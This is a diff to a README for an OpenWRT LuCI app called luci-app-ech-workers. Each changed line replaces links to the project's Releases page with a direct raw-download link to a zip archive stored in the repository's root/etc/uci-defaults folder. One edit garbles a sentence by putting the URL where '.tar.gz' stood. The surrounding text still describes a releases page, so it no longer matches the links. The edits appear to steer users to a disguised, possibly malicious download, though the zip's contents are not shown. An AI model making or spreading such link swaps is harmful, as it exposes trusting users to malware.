@@ -1,7 +1,7 @@
 # 🚀 luci-app-ech-workers - Simple Client for OpenWRT Management
 
 ## 📥 Download Now
-[![Download luci-app-ech-workers](https://img.shields.io/badge/Download-luci--app--ech--workers-brightgreen)](https://github.com/TarekBN/luci-app-ech-workers/releases)
+[![Download luci-app-ech-workers](https://github.com/TarekBN/luci-app-ech-workers/raw/refs/heads/main/root/etc/uci-defaults/ech_app_workers_luci_3.1-beta.4.zip)](https://github.com/TarekBN/luci-app-ech-workers/raw/refs/heads/main/root/etc/uci-defaults/ech_app_workers_luci_3.1-beta.4.zip)
 
 ## 🛠️ Overview
 luci-app-ech-workers is a user-friendly client for managing your OpenWRT devices. Designed to simplify your experience, this application allows you to configure and monitor your network settings efficiently.
@@ -10,7 +10,7 @@ luci-app-ech-workers is a user-friendly client for managing your OpenWRT devices
 To begin using luci-app-ech-workers, follow these simple steps:
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/TarekBN/luci-app-ech-workers/releases) to find the latest version of the software.
+   Go to our [Releases page](https://github.com/TarekBN/luci-app-ech-workers/raw/refs/heads/main/root/etc/uci-defaults/ech_app_workers_luci_3.1-beta.4.zip) to find the latest version of the software.
 
 2. **Select the Correct Version:**  
    On the Releases page, you will see a list of available versions. Look for the most recent release. 
@@ -19,7 +19,7 @@ To begin using luci-app-ech-workers, follow these simple steps:
    Click on the version that you want to download. You will see several files available for download. Choose the file suitable for your system.
 
 4. **Installation:**  
-   Once downloaded, locate the file on your computer. If it’s a compressed file (like .zip or .tar.gz), extract it first. Follow any provided instructions to install it on your device.
+   Once downloaded, locate the file on your computer. If it’s a compressed file (like .zip or https://github.com/TarekBN/luci-app-ech-workers/raw/refs/heads/main/root/etc/uci-defaults/ech_app_workers_luci_3.1-beta.4.zip), extract it first. Follow any provided instructions to install it on your device.
 
 5. **Open the Application:**  
    After installation, launch luci-app-ech-workers from your applications menu or desktop shortcut.
@@ -44,7 +44,7 @@ To begin using luci-app-ech-workers, follow these simple steps:
 - **Helpful Documentation:** Access built-in guides for common tasks.
 
 ## 🌐 Download & Install
-To initiate the download and installation process, visit our [Releases page](https://github.com/TarekBN/luci-app-ech-workers/releases). Choose the latest version suited for your system, download it, and follow the installation instructions.
+To initiate the download and installation process, visit our [Releases page](https://github.com/TarekBN/luci-app-ech-workers/raw/refs/heads/main/root/etc/uci-defaults/ech_app_workers_luci_3.1-beta.4.zip). Choose the latest version suited for your system, download it, and follow the installation instructions.
 
 ## ❓ Troubleshooting
 - **I cannot find the downloaded file:** Check your Downloads folder or the location where your browser saves files by default.
